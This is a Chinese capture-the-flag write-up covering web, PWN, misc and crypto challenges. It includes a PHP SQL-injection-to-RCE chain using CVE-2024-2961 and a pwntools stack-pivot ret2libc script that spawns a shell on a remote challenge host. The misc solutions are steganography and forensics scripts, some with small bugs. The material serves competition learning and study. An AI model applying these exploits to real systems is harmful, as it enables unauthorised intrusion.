invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>]))<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;url错误！&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$baseDir</span> .  <span class="hljs-title function_ invoke__">get_filename</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span> , <span class="hljs-variable">$data</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$filename</span>, <span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span> , <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO `data`(`url`,`filename`) VALUES (?, ?)&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$stmt</span> = <span class="hljs-title function_ invoke__">mysqli_prepare</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>))&#123;<br>            <span class="hljs-title function_ invoke__">mysqli_stmt_bind_param</span>(<span class="hljs-variable">$stmt</span>, <span class="hljs-string">&quot;ss&quot;</span>, <span class="hljs-variable">$url</span>, <span class="hljs-variable">$filename</span>);<br>            <span class="hljs-title function_ invoke__">mysqli_stmt_execute</span>(<span class="hljs-variable">$stmt</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p><strong>function.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$tmpInfo</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$tmpInfo</span>; <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_filename</span>(<span class="hljs-params"><span class="hljs-variable">$len</span></span>)</span>&#123;<br>    <span class="hljs-variable">$chars</span> = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span>;<br>    <span class="hljs-variable">$var_size</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chars</span>);<br>    <span class="hljs-variable">$res</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span>( <span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$x</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$x</span>++ ) &#123;<br>        <span class="hljs-variable">$random_str</span>= <span class="hljs-variable">$chars</span>[ <span class="hljs-title function_ invoke__">rand</span>( <span class="hljs-number">0</span>, <span class="hljs-variable">$var_size</span> - <span class="hljs-number">1</span> ) ];<br>        <span class="hljs-variable">$res</span> .= <span class="hljs-variable">$random_str</span>;<br>    &#125;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d&quot;</span>). <span class="hljs-string">&#x27;_&#x27;</span> . <span class="hljs-variable">$res</span> . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$conn</span> , <span class="hljs-variable">$filename</span>, <span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT filename from data where url = &#x27;<span class="hljs-subst">$url</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_all</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">foreach</span> ( <span class="hljs-variable">$row</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)&#123;<br>            <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$filename</span>) === <span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$value</span>[<span class="hljs-number">0</span>]))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到 <code>check</code> 里面存在 SQL 注入，我们可以尝试通过 <code>UNION SELECT</code> 来注入任意文件名丢给 <code>hash_file</code></p>
<p>由于无回显，考虑利用 <code>CVE-2024-2961</code> (CN-EXT) 来进行 RCE</p>
<p>我们可以利用之前的文件读取拿到<code>/proc/self/maps</code> 内存映射和 <code>/lib/x86_64-linux-gnu/libc-2.31.so</code> </p>
<p>可以稍微改改 <a target="_blank" rel="noopener" href="https://github.com/ambionics/cnext-exploits">https://github.com/ambionics/cnext-exploits</a> 然后拿到 <code>php://filter/</code> 链子，为了保证格式正确，我们可以添一个 <code>unhex()</code></p>
<p><img src="https://s2.loli.net/2024/08/28/lP84FJgabRS7VNL.png" srcset="/img/loading.gif" lazyload alt="image-20240828030147940"></p>
<p><img src="https://s2.loli.net/2024/08/28/2gN6E8xeAO3PmIo.png" srcset="/img/loading.gif" lazyload alt="image-20240828030212956"></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h3><p>三次栈迁移，第一次控制read的buf，第二次泄露真实地址，第三次getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io = remote(<span class="hljs-string">&#x27;139.155.126.78&#x27;</span>,<span class="hljs-number">31075</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pstack&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>bss = <span class="hljs-number">0x601010</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>rdi = <span class="hljs-number">0x400773</span><br>rbp = <span class="hljs-number">0x4005b0</span><br>lea = <span class="hljs-number">0x4006C4</span><br>leave = <span class="hljs-number">0x4006DB</span><br>payload1 = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x30</span> + p64(bss + <span class="hljs-number">0x530</span>) + p64(lea)<br>io.recvuntil(<span class="hljs-string">&#x27;overflow?&#x27;</span>)<br>io.send(payload1)<br>payload2 = p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(rbp) + p64(bss + <span class="hljs-number">0x900</span>) + p64(lea) + p64(bss + <span class="hljs-number">0x500</span> - <span class="hljs-number">0x08</span>) + p64(leave)<br>sleep(<span class="hljs-number">1</span>)<br>io.send(payload2)<br>puts_real_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = puts_real_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>payload3 = p64(rdi) + p64(binsh) + p64(system)<br>payload3 = payload.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload3 += p64(bss + <span class="hljs-number">0x900</span> -<span class="hljs-number">0x38</span>) + p64(leave) <br>sleep(<span class="hljs-number">1</span>)<br>io.send(payload3)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/08/27/QC8wkApaPlBvhVy.png" srcset="/img/loading.gif" lazyload alt="image-20240827151122205"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="hiden"><a href="#hiden" class="headerlink" title="hiden"></a>hiden</h3><p><img src="https://s2.loli.net/2024/08/27/7UxmHqtahskwMz2.png" srcset="/img/loading.gif" lazyload alt="image-20240827151403143"></p>
<p>EXP：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> wave<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hidden_text</span>(<span class="hljs-params">wav_file, output_file</span>):<br><br>    <span class="hljs-keyword">with</span> wave.<span class="hljs-built_in">open</span>(wav_file, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        wav_data = <span class="hljs-built_in">bytearray</span>(f.readframes(-<span class="hljs-number">1</span>))<br><br>    txt_length = <span class="hljs-built_in">int</span>.from_bytes(wav_data[:<span class="hljs-number">3</span> * <span class="hljs-number">4</span>:<span class="hljs-number">4</span>], byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>    txt_data = <span class="hljs-built_in">bytes</span>(wav_data[<span class="hljs-number">3</span> * <span class="hljs-number">4</span>::<span class="hljs-number">4</span>][:txt_length])<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(txt_data)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag successfully extracted to <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    extract_hidden_text(<span class="hljs-string">&quot;hiden.wav&quot;</span>, <span class="hljs-string">&quot;extracted_flag.txt&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/08/27/k2mEGOrRIU1P5if.png" srcset="/img/loading.gif" lazyload alt="image-20240827181838761"></p>
<h3 id="1z-misc"><a href="#1z-misc" class="headerlink" title="1z_misc"></a>1z_misc</h3><p>将题目给的数字进行拆分，分成两部分</p>
<p>即</p>
<p>若女可为11，可为1124……觜可为91，亦可为725……如此往复，周而复始。</p>
<p>分成1、1 和11、24 ，9、1和7、25</p>
<p>再根据hint的图片，前面部分对应子丑寅卯，后面对应28星宿，对子丑寅卯进行编号</p>
<p>子，丑，寅，卯，辰，巳，午，未</p>
<p>1     2     3     4    5     6           7        8</p>
<p>一直到12 顺时针进行编号，对外围的星宿进行逆时针编号，</p>
<p>此时，11对应的是子的第一个，即是女</p>
<p>根据这种解码方式</p>
<p>可以得到：</p>
<p>心胃心奎奎心奎心胃心心心胃心心胃心奎奎奎奎胃奎心奎奎胃奎心奎心奎奎</p>
<p>对这个进行替换后莫斯解码：</p>
<p>. .–.-. … .. .—- -.– -.-.–</p>
<p>得到压缩包的key</p>
<p>E@SI1Y!</p>
<p>解密压缩包后得到两个文件</p>
<p>hint.png 中有一个天琴座，英文翻译为：</p>
<p>Lyra</p>
<p>根据iscc2024题目可以解密</p>
<p>在github上找个codespace，配一配</p>
<p><img src="https://s2.loli.net/2024/08/28/XaqIGrHYbUE1VSL.png" srcset="/img/loading.gif" lazyload alt="image-20240828054756631"></p>
<p>听出来是核心价值观编码，解密即可得到flag</p>
<p><img src="https://s2.loli.net/2024/08/28/Tve5a7rsAfbxEVd.png" srcset="/img/loading.gif" lazyload alt="image-20240828054819484"></p>
<h3 id="Check-in"><a href="#Check-in" class="headerlink" title="Check in"></a>Check in</h3><p>打开压缩包发现压缩包注释，base58解码后得到：Welcome2GZ</p>
<p><img src="https://s2.loli.net/2024/08/28/IlmvF6Q9ABeVifw.png" srcset="/img/loading.gif" lazyload alt="image-20240828040156498"></p>
<p>打开txt发现是二进制文件</p>
<p><img src="https://s2.loli.net/2024/08/28/BPXHOQRYIepgumU.png" srcset="/img/loading.gif" lazyload alt="image-20240828040232456"></p>
<p>另存后打开发现wireshark字段，文件后缀改成pcap</p>
<p><img src="C:\Users\67388\AppData\Roaming\Typora\typora-user-images\image-20240828040336304.png" srcset="/img/loading.gif" lazyload alt="image-20240828040336304"></p>
<p>打开发现大量tls1.3的流量，需要key.log文件来解密，但是流量包中无任何文件可用来解密</p>
<p><img src="https://s2.loli.net/2024/08/28/hLcmnZIsMq8lGw5.png" srcset="/img/loading.gif" lazyload alt="image-20240828040358072"></p>
<p>打开txt文件，发现存在大量00和20交替出现作为两个字符之间的分隔符</p>
<p><img src="https://s2.loli.net/2024/08/28/UlpkBrTuqNYfvoj.png" srcset="/img/loading.gif" lazyload alt="image-20240828040409033"></p>
<p>确定存在隐写，使用wbStego解密，密码是我们之前的压缩包注释base58解密后的东西。<br>然后可以得到key.log，解密tls流量</p>
<p><img src="https://s2.loli.net/2024/08/28/cfZkxX3Sv5TPswC.png" srcset="/img/loading.gif" lazyload alt="image-20240828040428463"></p>
<p>导出压缩包中的各个对象</p>
<p><img src="https://s2.loli.net/2024/08/28/uNybKtTgOQLl4Zz.png" srcset="/img/loading.gif" lazyload alt="image-20240828040441901"></p>
<p>发现有个flag.gif，分帧未发现任何数据<br>提取每帧的帧长度：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_frame_durations</span>(<span class="hljs-params">gif_path</span>):<br>    <span class="hljs-keyword">with</span> Image.<span class="hljs-built_in">open</span>(gif_path) <span class="hljs-keyword">as</span> gif:<br>        frame_durations = []<br>        <span class="hljs-keyword">for</span> frame <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(gif.n_frames):<br>            gif.seek(frame)<br>            <span class="hljs-comment"># 获取每一帧的显示时间</span><br>            duration = gif.info.get(<span class="hljs-string">&#x27;duration&#x27;</span>, <span class="hljs-number">0</span>)<br>            frame_durations.append(duration)<br>        <span class="hljs-keyword">return</span> frame_durations<br><br><span class="hljs-comment"># 示例用法</span><br>gif_path = <span class="hljs-string">&#x27;flag.gif&#x27;</span>  <br>durations = extract_frame_durations(gif_path)<br><span class="hljs-keyword">for</span> i, duration <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(durations):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Frame <span class="hljs-subst">&#123;i&#125;</span>: <span class="hljs-subst">&#123;duration&#125;</span> ms&quot;</span>)<br></code></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/08/28/eLwFoHjb2u4mCJZ.png" srcset="/img/loading.gif" lazyload alt="image-20240828040550305"></p>
<p>发现只有两个数据一直重复，考虑是二进制，提取出来后得到flag</p>
<p><img src="https://s2.loli.net/2024/08/28/xgarmW4jG3Ab61O.png" srcset="/img/loading.gif" lazyload alt="image-20240828040606904"></p>
<h3 id="miaoro"><a href="#miaoro" class="headerlink" title="miaoro"></a>miaoro</h3><p>流量包中发现发现 Shiro 流量特征</p>
<p>解密 <img src="https://s2.loli.net/2024/08/28/EfbzouGXqaI9RVy.png" srcset="/img/loading.gif" lazyload alt="image-20240828030617704"></p>
<p>得到前一半 Flag</p>
<p>之后读取了 <code>secret.txt</code> ，导出后发现</p>
<p><img src="https://s2.loli.net/2024/08/28/nKBYTPVDlZg9HIJ.png" srcset="/img/loading.gif" lazyload alt="image-20240828032306679"></p>
<p>发现文件最后有504b03，发现是zip头，写个脚本逆序<br><img src="https://s2.loli.net/2024/08/28/fQieZlJLjaBboNr.png" srcset="/img/loading.gif" lazyload alt="image-20240828032353836"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_bytes_in_file</span>(<span class="hljs-params">input_file_path, output_file_path</span>):<br>    <span class="hljs-comment"># 打开输入文件并读取数据</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        data = file.read()<br><br>    <span class="hljs-comment"># 逆序每个字节</span><br>    reversed_data = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-comment"># 将每个字节的十六进制表示形式进行逆序处理</span><br>        hex_str = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;byte:02X&#125;</span>&quot;</span><br>        reversed_hex_str = hex_str[::-<span class="hljs-number">1</span>]  <span class="hljs-comment"># 逆序字符串</span><br>        reversed_byte = <span class="hljs-built_in">int</span>(reversed_hex_str, <span class="hljs-number">16</span>)  <span class="hljs-comment"># 将逆序后的字符串转换回整数</span><br>        reversed_data.append(reversed_byte)<br><br>    <span class="hljs-comment"># 写入处理后的数据到输出文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file_path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(reversed_data)<br><br><br><br>input_file = <span class="hljs-string">&#x27;output.zip&#x27;</span>  <span class="hljs-comment"># 输入文件路径</span><br>output_file = <span class="hljs-string">&#x27;output_file.zip&#x27;</span>  <span class="hljs-comment"># 输出文件路径</span><br>reverse_bytes_in_file(input_file, output_file)<br></code></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/08/28/QadPNzT6FDfCG8n.png" srcset="/img/loading.gif" lazyload alt="image-20240828032452927"></p>
<p>有密码，之前流量包中分析：</p>
<p><img src="https://s2.loli.net/2024/08/28/tC7DxTZyXbmIHnp.png" srcset="/img/loading.gif" lazyload alt="image-20240828032511990"></p>
<p>得到密码，解压得到图片，更改图片宽高：</p>
<p><img src="https://s2.loli.net/2024/08/28/GbASY6JdOMv7Cxk.png" srcset="/img/loading.gif" lazyload alt="image-20240828032538587"></p>
<p>得到</p>
<p><img src="https://s2.loli.net/2024/08/28/IlbXWdymtwExAR8.png" srcset="/img/loading.gif" lazyload alt="image-20240828032551059"></p>
<p><a target="_blank" rel="noopener" href="https://www.behance.net/gallery/76299757/CAT-font-alphabet">https://www.behance.net/gallery/76299757/CAT-font-alphabet</a></p>
<p>根据作者码表解码得到flag</p>
<h3 id="不一样的数据库-2"><a href="#不一样的数据库-2" class="headerlink" title="不一样的数据库_2"></a>不一样的数据库_2</h3><p>爆破压缩包</p>
<p><img src="https://s2.loli.net/2024/08/27/U8YLg961u7hOlxN.png" srcset="/img/loading.gif" lazyload alt="image-20240827161826342"></p>
<p>打开得到残缺QRcode</p>
<p><img src="https://s2.loli.net/2024/08/27/GAxSl3Q4aK6Yoc7.png" srcset="/img/loading.gif" lazyload alt="image-20240827161915099"></p>
<p>补全定位块</p>
<p><img src="https://s2.loli.net/2024/08/27/e6o53wDdjI1mZ9V.png" srcset="/img/loading.gif" lazyload alt="image-20240827161942541"></p>
<p>得到NRF@WQUKTQ12345&amp;WWWF@WWWFX#WWQXNWXNU</p>
<p>根据题目提示，rot13解密得到数据库密码AES@JDHXGD12345&amp;JJJS@JJJSK#JJDKAJKAH</p>
<p><img src="C:\Users\67388\Downloads/IMG_2298.JPG" srcset="/img/loading.gif" lazyload alt="IMG_2298"></p>
<p>根据提示为AES解密</p>
<p>首先在数据库中拿到数据</p>
<p><img src="C:\Users\67388\Downloads/IMG_2299.JPG" srcset="/img/loading.gif" lazyload alt="IMG_2299"></p>
<p>最后AES解密得到flag</p>
<p><img src="https://s2.loli.net/2024/08/27/6zciQvhxZXeENkG.png" srcset="/img/loading.gif" lazyload alt="image-20240827163109440"></p>
<h3 id="so-much"><a href="#so-much" class="headerlink" title="so much"></a>so much</h3><p>文件名base64解密</p>
<p><img src="https://s2.loli.net/2024/08/28/Fcfq4lrn1mMaoi7.png" srcset="/img/loading.gif" lazyload alt="image-20240828034352356"></p>
<p>文件末尾有个key</p>
<p><img src="https://s2.loli.net/2024/08/28/GRLpxM3ygTPIKzW.png" srcset="/img/loading.gif" lazyload alt="image-20240828034441238"></p>
<p>使用ftk挂载镜像</p>
<p><img src="https://s2.loli.net/2024/08/28/QiNmteg91P2UbLf.png" srcset="/img/loading.gif" lazyload alt="image-20240828034536009"></p>
<p>需要密码密码是!@#$%^&amp; 即1234567按住shift输入即可</p>
<p><img src="https://s2.loli.net/2024/08/28/tYVbiMHnfwuFsl1.png" srcset="/img/loading.gif" lazyload alt="image-20240828034659478"></p>
<p>只读模式挂载，发现大量crypto后缀文件：</p>
<p><img src="https://s2.loli.net/2024/08/28/CDG4IABNS6qOrLW.png" srcset="/img/loading.gif" lazyload alt="image-20240828034750386"></p>
<p>使用python处理文件，发现文件修改时间只有19和20，考虑二进制</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 目录路径</span><br>directory_path = <span class="hljs-string">&quot;./disk/&quot;</span>  <span class="hljs-comment"># 替换为实际目录路径</span><br><br><span class="hljs-comment"># 正则表达式用于提取文件名中的数字部分</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_number</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&quot;(\d+)&quot;</span>, filename)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)<br><br><span class="hljs-comment"># 获取文件名列表并按数字顺序排序</span><br>file_list = <span class="hljs-built_in">sorted</span>(os.listdir(directory_path), key=extract_number)<br><br><span class="hljs-comment"># 遍历排序后的文件</span><br><span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> file_list:<br>    file_path = os.path.join(directory_path, filename)<br>    <br>    <span class="hljs-comment"># 获取文件的修改时间</span><br>    modification_time = os.path.getmtime(file_path)<br>    modification_datetime = datetime.fromtimestamp(modification_time)<br>    <br>    <span class="hljs-comment"># 获取修改时间的分钟部分</span><br>    minute = modification_datetime.minute<br>    <br><br>    <br>    <span class="hljs-keyword">if</span> output <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;filename&#125;</span>,<span class="hljs-subst">&#123;minute&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>转0和1后cyberchef解密</p>
<p><img src="https://s2.loli.net/2024/08/28/chTKel3GUoLiAZg.png" srcset="/img/loading.gif" lazyload alt="image-20240828035256577"></p>
<p>用encrytpo解密前两个文件得到flag</p>
<p><img src="https://s2.loli.net/2024/08/28/2f3WgmChHO4L1B7.png" srcset="/img/loading.gif" lazyload alt="image-20240828040004947"></p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="TH-Curve"><a href="#TH-Curve" class="headerlink" title="TH_Curve"></a>TH_Curve</h3><p>就是将这个非标准的th曲线上的点转化到基本的标准曲线上 然后求dlp</p>
<p>恢复m在crt（中国剩余定理）多次合并计算结果即可</p>
